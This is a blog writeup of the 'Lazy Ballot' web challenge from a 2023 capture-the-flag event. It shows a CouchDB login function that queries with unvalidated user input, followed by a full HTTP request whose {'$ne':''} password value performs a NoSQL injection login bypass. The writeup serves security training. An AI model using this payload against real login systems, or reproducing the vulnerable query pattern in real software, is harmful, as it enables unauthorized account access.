---
layout: post
title: HTB Business CTF 2023 Writeup - Web - Lazy Ballot
date: 2023-07-19
type: post
tags:
- Writeup
- Hacking
- BusinessCTF
- CTF
permalink: /2023/07/HTBBusinessCTF/WebLazyBallot
img: 2023/07/HTBBusinessCTF/LazyBallot/LazyBallotDescription.png
---

In this challenge, I had to exploit a NoSQL injection vulnerability in CouchDB.

> Very Easy

> As a Zenium State hacker, your mission is to breach Arodor's secure election system, subtly manipulating the results to create political chaos and destabilize their government, ultimately giving Zenium State an advantage in the global power struggle.

The challenge provided the source code to the web application. I looked at the code to log in the application.


```js
async loginUser(username, password) {
    const options = {
        selector: {
            username: username,
            password: password,
        },
    };

    const resp = await this.userdb.find(options);
    if (resp.docs.length) return true;

    return false;
}
```

It was quering CouchDB to validate the username and password provided by the user. There was no validation or escaping done on the data. I looked for how to do [NoSQL injection in CouchDB](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf). Turned out it's the same as in MongoDB.

I intercepted the login request in Caido and crafted the injection payload.

```http
POST /api/login HTTP/1.1
Host: 94.237.52.136:30851
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://94.237.52.136:30851/login
Content-Type: application/json
Origin: http://94.237.52.136:30851
Connection: keep-alive
Cookie: connect.sid=s%3A0vAPBnbt2c92D38LlRLoFbhpLjvLCoAa.%2BZxScmLRomvTFUyYmySOdTNZI8BBQkVyVp4PFwRk2J4
Content-Length: 42

{"username":"admin","password":{"$ne":""}}
```

I was logged in.

![Logged In](/assets/images/2023/07/HTBBusinessCTF/LazyBallot/LoggedIn.png "Logged In")

I went to the last page and found the flag.

![Flag](/assets/images/2023/07/HTBBusinessCTF/LazyBallot/Flag.png "Flag")
